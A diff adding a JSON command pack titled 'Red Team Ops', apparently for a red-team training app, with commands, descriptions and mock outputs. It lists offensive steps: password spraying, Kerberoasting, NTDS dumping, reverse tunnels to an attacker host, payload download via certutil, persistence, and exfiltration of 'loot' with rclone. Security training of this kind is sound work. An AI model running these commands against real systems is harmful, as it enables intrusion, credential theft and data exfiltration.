@@ -1,0 +1,314 @@
+{
+  "packId": "advanced",
+  "title": "Red Team Ops",
+  "summary": "Full-spectrum tradecraft covering pivoting, AD exploitation en cloud ops.",
+  "difficulty": "advanced",
+  "commands": [
+    {
+      "id": "nmap-oA",
+      "command": "nmap -sC -sV -oA recon 10.10.10.89",
+      "description": "Baseline script and version scan that writes all output formats.",
+      "description_long": "Runs default scripts, version probes and stores grepable, XML en normal reports as recon.*.",
+      "mock_output": "PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.54\n",
+      "accepted_variants": ["nmap -sC -sV -oA recon 10.10.10.89"],
+      "tags": ["nmap", "recon"]
+    },
+    {
+      "id": "nmap-vuln",
+      "command": "nmap --script vuln -p 80,443 target.local",
+      "description": "Run targeted NSE vuln scripts against web surfaces.",
+      "description_long": "Leverages the vuln category on the specified ports.",
+      "mock_output": "PORT    STATE SERVICE \n80/tcp  open  http\n| http-vuln-cve2017-5638: Likely Apache Struts2 CVE-2017-5638\n",
+      "accepted_variants": ["nmap --script vuln -p 80,443 target.local"],
+      "tags": ["nmap", "exploitation"]
+    },
+    {
+      "id": "crackmapexec-smb",
+      "command": "crackmapexec smb 10.10.10.0/24 -u svc -p Winter2024! -d CORP",
+      "description": "Spray SMB logons across the subnet using known creds.",
+      "description_long": "Enumerates SMB shares and authentication success using CME.",
+      "mock_output": "SMB         10.10.10.21     445  TARGET01        [+] CORP\\svc:Winter2024!",
+      "accepted_variants": ["crackmapexec smb 10.10.10.0/24 -u svc -p Winter2024! -d CORP"],
+      "tags": ["ad", "lateral"]
+    },
+    {
+      "id": "evil-winrm",
+      "command": "evil-winrm -i 10.10.10.98 -u administrator -p 'P@ssw0rd!'",
+      "description": "Drop into a PowerShell remoting shell on a compromised host.",
+      "description_long": "Uses Evil-WinRM with explicit creds against the provided address.",
+      "mock_output": "*Evil-WinRM* PS C:\\Users\\Administrator> ",
+      "accepted_variants": ["evil-winrm -i 10.10.10.98 -u administrator -p 'P@ssw0rd!'"] ,
+      "tags": ["ad", "shell"]
+    },
+    {
+      "id": "smbclient-share",
+      "command": "smbclient -U 'CORP/user%Winter2024!' //dc01/c$",
+      "description": "Mount the ADMIN$ share using domain creds.",
+      "description_long": "Opens an SMB client session to the default admin share.",
+      "mock_output": "smb: \\> ",
+      "accepted_variants": ["smbclient -U 'CORP/user%Winter2024!' //dc01/c$"],
+      "tags": ["ad", "lateral"]
+    },
+    {
+      "id": "ldapsearch-base",
+      "command": "ldapsearch -x -H ldap://10.10.10.5 -b \"dc=corp,dc=local\"",
+      "description": "Query LDAP anonymously for baseline directory info.",
+      "description_long": "Uses simple bind to dump directory data from the domain controller.",
+      "mock_output": "dn: DC=corp,DC=local\nobjectClass: top\n",
+      "accepted_variants": ["ldapsearch -x -H ldap://10.10.10.5 -b \"dc=corp,dc=local\""] ,
+      "tags": ["ad", "recon"]
+    },
+    {
+      "id": "getuserSPNs",
+      "command": "impacket-getuserspns -dc-ip 10.10.10.5 CORP/analyst:Tr1ck2024",
+      "description": "Enumerate SPNs and dump hashes for kerberoasting.",
+      "description_long": "Queries the DC for service principal names with supplied creds.",
+      "mock_output": "ServicePrincipalName  Name     MemberOf  PasswordLastSet\nHTTP/web.corp.local   WEB$     -         2023-12-10 12:01:11\n",
+      "accepted_variants": ["impacket-getuserspns -dc-ip 10.10.10.5 CORP/analyst:Tr1ck2024"],
+      "tags": ["ad", "exploitation"]
+    },
+    {
+      "id": "secretsdump",
+      "command": "impacket-secretsdump -dc-ip 10.10.10.5 CORP/analyst:Tr1ck2024@10.10.10.5",
+      "description": "Dump NTDS secrets once DCSync is available.",
+      "description_long": "Uses Impacket secretsdump with explicit DC IP and creds.",
+      "mock_output": "[*] Dumping Domain Credentials (domain\nuser:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
+      "accepted_variants": ["impacket-secretsdump -dc-ip 10.10.10.5 CORP/analyst:Tr1ck2024@10.10.10.5"],
+      "tags": ["ad", "exfil"]
+    },
+    {
+      "id": "kerbrute",
+      "command": "kerbrute userenum --dc 10.10.10.5 corp.local/users.txt",
+      "description": "Enumerate valid AD accounts via Kerberos pre-auth responses.",
+      "description_long": "Uses kerbrute userenum with supplied user wordlist.",
+      "mock_output": "[+] VALID USERNAME: svc-backups @ corp.local",
+      "accepted_variants": ["kerbrute userenum --dc 10.10.10.5 corp.local/users.txt"],
+      "tags": ["ad", "recon"]
+    },
+    {
+      "id": "bloodhound",
+      "command": "bloodhound-python -d corp.local -u analyst -p Tr1ck2024 -gc dc01.corp.local -c All",
+      "description": "Collect full BloodHound data using LDAP and SMB collectors.",
+      "description_long": "Runs the All collection method against the specified domain.",
+      "mock_output": "INFO: Collecting session data...\nINFO: Compressing output into 20240109_analyst_bloodhound.zip\n",
+      "accepted_variants": ["bloodhound-python -d corp.local -u analyst -p Tr1ck2024 -gc dc01.corp.local -c All"],
+      "tags": ["ad", "mapping"]
+    },
+    {
+      "id": "python-pty",
+      "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "description": "Upgrade a basic shell to a pseudo-TTY for stability.",
+      "description_long": "Spawns an interactive bash within the existing shell.",
+      "mock_output": "bash-5.1$ ",
+      "accepted_variants": ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+      "tags": ["shell", "linux"]
+    },
+    {
+      "id": "socat-forward",
+      "command": "socat TCP-LISTEN:9001,reuseaddr,fork TCP:10.10.14.2:9001",
+      "description": "Pivot a listener through a compromised host.",
+      "description_long": "Relays connections from port 9001 to the operator box.",
+      "mock_output": "",
+      "accepted_variants": ["socat TCP-LISTEN:9001,reuseaddr,fork TCP:10.10.14.2:9001"],
+      "tags": ["pivot", "tunneling"]
+    },
+    {
+      "id": "chisel-server",
+      "command": "chisel server -p 8000 --reverse",
+      "description": "Run a chisel server prepared for reverse tunnels.",
+      "description_long": "Listens on port 8000 and accepts reverse connections.",
+      "mock_output": "2024/01/09 09:12:00 server: Reverse tunnelling enabled",
+      "accepted_variants": ["chisel server -p 8000 --reverse"],
+      "tags": ["pivot", "tunneling"]
+    },
+    {
+      "id": "chisel-client",
+      "command": "chisel client 10.10.14.3:8000 R:1080:socks",
+      "description": "Build a reverse SOCKS proxy over chisel.",
+      "description_long": "Creates a remote listener at 1080 to provide SOCKS access.",
+      "mock_output": "2024/01/09 09:13:12 client: Connection established",
+      "accepted_variants": ["chisel client 10.10.14.3:8000 R:1080:socks"],
+      "tags": ["pivot", "tunneling"]
+    },
+    {
+      "id": "plink-reverse",
+      "command": "plink.exe -R 9001:127.0.0.1:22 attacker@10.10.14.7",
+      "description": "Create a Windows SSH reverse tunnel back to your box.",
+      "description_long": "Forwards remote port 9001 to local SSH on compromised Windows host.",
+      "mock_output": "Using username \"attacker\".\nAttacker's password:",
+      "accepted_variants": ["plink.exe -R 9001:127.0.0.1:22 attacker@10.10.14.7"],
+      "tags": ["pivot", "windows"]
+    },
+    {
+      "id": "nc-listener",
+      "command": "nc -lvnp 9001 -s 0.0.0.0",
+      "description": "Start a controlled netcat listener bound to all interfaces.",
+      "description_long": "Listens on port 9001 with verbose output.",
+      "mock_output": "listening on [any] 9001 ...",
+      "accepted_variants": ["nc -lvnp 9001 -s 0.0.0.0"],
+      "tags": ["shell", "listener"]
+    },
+    {
+      "id": "certutil-download",
+      "command": "certutil -urlcache -split -f http://10.10.14.7/payload.exe payload.exe",
+      "description": "Use built-in tooling to pull binaries on Windows hosts.",
+      "description_long": "Downloads payload.exe and caches it locally.",
+      "mock_output": "****  Online  ****\n  0000  ...\nCertUtil: -URLCache-opdracht voltooid.\n",
+      "accepted_variants": ["certutil -urlcache -split -f http://10.10.14.7/payload.exe payload.exe"],
+      "tags": ["windows", "transfer"]
+    },
+    {
+      "id": "powershell-bypass",
+      "command": "powershell -ExecutionPolicy Bypass -File insight.ps1",
+      "description": "Execute a PS1 script while bypassing execution policy.",
+      "description_long": "Runs insight.ps1 without altering global policy settings.",
+      "mock_output": "[+] Collected 120 local admins\n",
+      "accepted_variants": ["powershell -ExecutionPolicy Bypass -File insight.ps1"],
+      "tags": ["windows", "automation"]
+    },
+    {
+      "id": "wevtutil",
+      "command": "wevtutil qe Security /q:\"*[System[(EventID=4624)]]\" /c:5 /f:text",
+      "description": "Query the five most recent logon events for traces.",
+      "description_long": "Uses XPath filtering to pull logon success events.",
+      "mock_output": "Event[0]:\n  Account Name: Administrator\n",
+      "accepted_variants": ["wevtutil qe Security /q:\"*[System[(EventID=4624)]]\" /c:5 /f:text"],
+      "tags": ["windows", "forensics"]
+    },
+    {
+      "id": "wmic-create",
+      "command": "wmic process call create \"cmd.exe /c whoami > C:\\temp\\who.txt\"",
+      "description": "Spawn a process remotely and log its identity.",
+      "description_long": "Uses WMI process create to run commands on Windows.",
+      "mock_output": "Executing (Win32_Process)->Create()\nMethod execution successful.\n",
+      "accepted_variants": ["wmic process call create \"cmd.exe /c whoami > C:\\temp\\who.txt\""] ,
+      "tags": ["windows", "lateral"]
+    },
+    {
+      "id": "schtasks",
+      "command": "schtasks /create /sc once /tn \"Persistence\" /tr \"cmd /c calc.exe\" /st 23:59",
+      "description": "Create a one-time scheduled task for persistence testing.",
+      "description_long": "Schedules calc.exe for execution at set time.",
+      "mock_output": "SUCCESS: The scheduled task \"Persistence\" has successfully been created.",
+      "accepted_variants": ["schtasks /create /sc once /tn \"Persistence\" /tr \"cmd /c calc.exe\" /st 23:59"],
+      "tags": ["windows", "persistence"]
+    },
+    {
+      "id": "jq-filter",
+      "command": "jq '.findings[] | select(.critical==true)' findings.json",
+      "description": "Filter JSON to only show critical findings.",
+      "description_long": "Uses jq to select objects with critical flag true.",
+      "mock_output": "{\n  \"id\": 2024,\n  \"critical\": true,\n  \"summary\": \"RCE in upload handler\"\n}",
+      "accepted_variants": ["jq '.findings[] | select(.critical==true)' findings.json"],
+      "tags": ["analysis", "json"]
+    },
+    {
+      "id": "kubectl-pods",
+      "command": "kubectl get pods -A",
+      "description": "List every pod across all namespaces once you land in a cluster.",
+      "description_long": "Uses the -A flag for all namespaces.",
+      "mock_output": "NAMESPACE     NAME                        READY   STATUS    RESTARTS   AGE\ndefault       api-7c9d94d5c6-mkhzk       1/1     Running   0          3d\n",
+      "accepted_variants": ["kubectl get pods -A"],
+      "tags": ["cloud", "k8s"]
+    },
+    {
+      "id": "docker-shell",
+      "command": "docker run --rm -it alpine sh",
+      "description": "Spin a disposable Alpine shell for quick tooling.",
+      "description_long": "Runs kube-friendly Alpine container and drops into /bin/sh.",
+      "mock_output": "/ # ",
+      "accepted_variants": ["docker run --rm -it alpine sh"],
+      "tags": ["containers", "ops"]
+    },
+    {
+      "id": "az-login",
+      "command": "az login --use-device-code",
+      "description": "Authenticate into Azure without browser access.",
+      "description_long": "Generates a device code and waits for interactive confirmation.",
+      "mock_output": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code XXXX-XXXX to authenticate.",
+      "accepted_variants": ["az login --use-device-code"],
+      "tags": ["cloud", "azure"]
+    },
+    {
+      "id": "terraform-plan",
+      "command": "terraform plan -var-file=prod.tfvars",
+      "description": "Preview infrastructure changes before applying.",
+      "description_long": "Loads variables from prod.tfvars while generating the plan.",
+      "mock_output": "Plan: 2 to add, 0 to change, 0 to destroy.",
+      "accepted_variants": ["terraform plan -var-file=prod.tfvars"],
+      "tags": ["infra", "ops"]
+    },
+    {
+      "id": "ansible-check",
+      "command": "ansible-playbook site.yml -i hosts --check",
+      "description": "Run playbooks in dry-run mode to verify idempotence.",
+      "description_long": "Applies the configuration in check mode without changes.",
+      "mock_output": "PLAY RECAP *********************************************************************\ntarget01                 : ok=5    changed=0    unreachable=0    failed=0\n",
+      "accepted_variants": ["ansible-playbook site.yml -i hosts --check"],
+      "tags": ["automation", "ops"]
+    },
+    {
+      "id": "python-server",
+      "command": "python3 -m http.server 9001 --directory loot/",
+      "description": "Serve the loot directory over HTTP for quick sharing.",
+      "description_long": "Uses Python http.server rooted at ./loot.",
+      "mock_output": "Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...",
+      "accepted_variants": ["python3 -m http.server 9001 --directory loot/"],
+      "tags": ["transfer", "ops"]
+    },
+    {
+      "id": "rsync-exclude",
+      "command": "rsync -av --exclude '*.log' /var/www/ backups/www/",
+      "description": "Sync a webroot while skipping noisy log files.",
+      "description_long": "Uses rsync exclude glob to omit *.log.",
+      "mock_output": "sending incremental file list\ncss/style.css\njs/app.js\n",
+      "accepted_variants": ["rsync -av --exclude '*.log' /var/www/ backups/www/"],
+      "tags": ["transfer", "ops"]
+    },
+    {
+      "id": "git-clone-shallow",
+      "command": "git clone --depth=1 https://github.com/tex-tribe/hack-lab.git",
+      "description": "Grab only the latest snapshot of a repository for speed.",
+      "description_long": "Performs a shallow clone with depth 1.",
+      "mock_output": "Cloning into 'hack-lab'...\nremote: Enumerating objects: 42, done.\n",
+      "accepted_variants": ["git clone --depth=1 https://github.com/tex-tribe/hack-lab.git"],
+      "tags": ["git", "workflow"]
+    },
+    {
+      "id": "openssl-client",
+      "command": "openssl s_client -connect target.local:443 -servername target.local",
+      "description": "Inspect TLS handshakes and certificate chains.",
+      "description_long": "Initiates an SSL connection specifying SNI.",
+      "mock_output": "CONNECTED(00000003)\n---\nCertificate chain\n 0 s:CN=target.local\n",
+      "accepted_variants": ["openssl s_client -connect target.local:443 -servername target.local"],
+      "tags": ["crypto", "recon"]
+    },
+    {
+      "id": "openssl-csr",
+      "command": "openssl req -new -key server.key -out csr.pem",
+      "description": "Generate a certificate signing request for rogue cert abuse.",
+      "description_long": "Uses existing private key to craft a CSR.",
+      "mock_output": "You are about to be asked to enter information that will be incorporated...\n",
+      "accepted_variants": ["openssl req -new -key server.key -out csr.pem"],
+      "tags": ["crypto", "ops"]
+    },
+    {
+      "id": "7z-encrypt",
+      "command": "7z a -pR3dTe4m backup.7z loot/",
+      "description": "Compress and password protect exfil data with 7-Zip.",
+      "description_long": "Creates backup.7z from loot with password R3dTe4m.",
+      "mock_output": "Scanning the drive:\nEverything is Ok\n",
+      "accepted_variants": ["7z a -pR3dTe4m backup.7z loot/"],
+      "tags": ["transfer", "windows"]
+    },
+    {
+      "id": "rclone-sync",
+      "command": "rclone sync loot remote:ops-loot --progress",
+      "description": "Mirror loot folder into a remote bucket with progress stats.",
+      "description_long": "Uses rclone remote named remote to sync data.",
+      "mock_output": "Transferred:   25.678 MiB / 25.678 MiB, 100%, 1.234 MiB/s, ETA 0s\n",
+      "accepted_variants": ["rclone sync loot remote:ops-loot --progress"],
+      "tags": ["transfer", "cloud"]
+    }
+  ]
+}
